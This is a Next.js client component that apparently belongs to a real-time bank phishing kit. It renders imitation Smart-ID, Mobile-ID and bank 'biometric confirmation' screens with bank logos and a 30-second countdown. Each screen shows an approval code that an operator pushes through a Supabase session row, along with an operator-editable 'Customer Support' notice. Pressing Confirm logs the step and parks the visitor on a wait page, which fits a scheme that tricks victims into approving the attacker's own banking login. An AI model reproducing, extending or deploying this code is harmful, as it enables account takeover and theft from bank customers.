"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import { Linkify } from "@/components/ui/Linkify";

type ApprovalLang = "de" | "tr";

type ApprovalViewState = {
  sessionStatus: string;
  approvalStatus: string;
  approvalCode: string;
  bankSlug: string;
  bankName: string;
  message: string;
  imageUrl: string | null;
  lang: ApprovalLang;
};

const APPROVAL_LABELS: Record<string, string> = {
  smartid_1: "Smart-ID",
  smartid_2: "Smart-ID 2",
  mobileid_1: "Mobile-ID 1",
  mobileid_2: "Mobile-ID 2",
  biometrika_pin_1: "Biometrika / PIN 1",
  biometrika_pin_2: "Biometrika / PIN 2",
};

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function formatRemainingTime(seconds: number) {
  const safeSeconds = Math.max(0, seconds);
  const minutes = Math.floor(safeSeconds / 60)
    .toString()
    .padStart(2, "0");
  const remainingSeconds = (safeSeconds % 60).toString().padStart(2, "0");
  return `${minutes}:${remainingSeconds}`;
}

function SmartIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/smart-id-logo.png"
        alt="Smart-ID"
        width={176}
        height={40}
        priority
        className="h-auto w-[176px]"
      />
    </div>
  );
}

function MobileIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/mobile-id-logo.png"
        alt="Mobile-ID"
        width={178}
        height={42}
        priority
        className="h-auto w-[178px]"
      />
    </div>
  );
}

function SmartIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[352px] rounded-[18px] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
        <div className="mb-9 flex justify-center">
          <SmartIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Open the Smart-ID app on your phone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Confirming..." : "Confirm"}
          </button>
        </div>
      </div>
    </div>
  );
}

function GenericApprovalCard({
  title,
  approvalCode,
  secondsLeft,
  saving,
  onConfirm,
}: {
  title: string;
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Confirmation Required</h1>
        <p className="mb-6 text-base text-[#667085]">To continue, confirm the verification code shown on your device.</p>

        <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
          {approvalCode || "0000"}
        </div>

        <p className="mb-6 text-sm text-[#667085]">
          Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
        </p>

        <button
          type="button"
          onClick={onConfirm}
          disabled={saving}
          className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
        >
          {saving ? "Confirming..." : "Confirm"}
        </button>
      </div>
    </div>
  );
}

function MobileIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex justify-center">
          <MobileIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Open the Mobile-ID app on your phone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Confirming..." : "Confirm"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BiometricApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  bankSlug,
  bankName,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);

  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex min-h-[48px] items-center justify-center">
          {bankLogo ? (
            <img
              src={bankLogo}
              alt={bankName || bankSlug || "Banka"}
              className="max-h-12 w-auto max-w-[190px] object-contain"
            />
          ) : (
            <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
              {bankName || bankSlug || "Bank"}
            </div>
          )}
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Biometric Confirmation
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Confirming..." : "Confirm"}
          </button>
        </div>
      </div>
    </div>
  );
}

function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] border border-[#0066CC] bg-[#020b22] p-6 text-center shadow-[0_0_40px_rgba(0,102,204,0.3)] sm:p-10">
        <div className="mb-4">
          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Customer Support</p>
        </div>

        <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
          <Linkify text={message} />
        </p>

        {imageUrl ? (
          <div className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
            <img src={imageUrl} alt="Support" className="mx-auto h-auto w-full rounded-xl object-contain" />
          </div>
        ) : null}
      </div>
    </div>
  );
}

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [viewState, setViewState] = useState<ApprovalViewState>({
    sessionStatus: "",
    approvalStatus: "",
    approvalCode: "",
    bankSlug: "",
    bankName: "",
    message: "Please wait...",
    imageUrl: null,
    lang: "de",
  });

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached) setEffectiveSessionId(cached);
  }, [sessionId]);

  useEffect(() => {
    if (!viewState.approvalStatus) return;
    setSecondsLeft(30);

    const timer = window.setInterval(() => {
      setSecondsLeft((previous) => {
        if (previous <= 1) {
          window.clearInterval(timer);
          return 0;
        }
        return previous - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [viewState.approvalStatus, effectiveSessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
      const formData = sessionData?.form_data;
      const fd = (formData ?? {}) as Record<string, string | undefined>;
      setViewState({
        sessionStatus: sessionData?.status?.trim() ?? "",
        approvalStatus: fd.approvalStatus?.trim() ?? "",
        approvalCode: fd.approvalCode?.trim() ?? "",
        bankSlug: fd.bankSlug?.trim() ?? "",
        bankName: fd.bankName?.trim() ?? "",
        message: fd.specialNoticeText ?? fd.customMessage ?? "Please wait...",
        imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
        lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
      });
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase.from("sessions").select("status,form_data").eq("id", effectiveSessionId).maybeSingle();
      if (!data) {
        setReady(true);
        return;
      }
      applySessionData(data as { form_data?: Record<string, unknown> | null; status?: string | null });
    })();

    const channel = supabase
      .channel(`special-approval-content:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null; status?: string | null };
          applySessionData(next);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  async function handleApprovalSubmit() {
    if (!supabase || !effectiveSessionId) return;

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      viewState.approvalStatus,
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: viewState.approvalStatus,
          approvalCode: viewState.approvalCode,
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      router.push(stepToPath("wait", effectiveSessionId));
    }
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[#1464f4]/25 border-t-[#1464f4]" />
      </div>
    );
  }

  if (viewState.sessionStatus === "SPECIAL_INFO") {
    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
  }

  if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
    return (
      <SmartIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "smartid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "mobileid_1" || viewState.approvalStatus === "mobileid_2") {
    return (
      <MobileIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "biometrika_pin_1" || viewState.approvalStatus === "biometrika_pin_2") {
    return (
      <BiometricApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus) {
    return (
      <GenericApprovalCard
        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Kinnitus"}
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
}
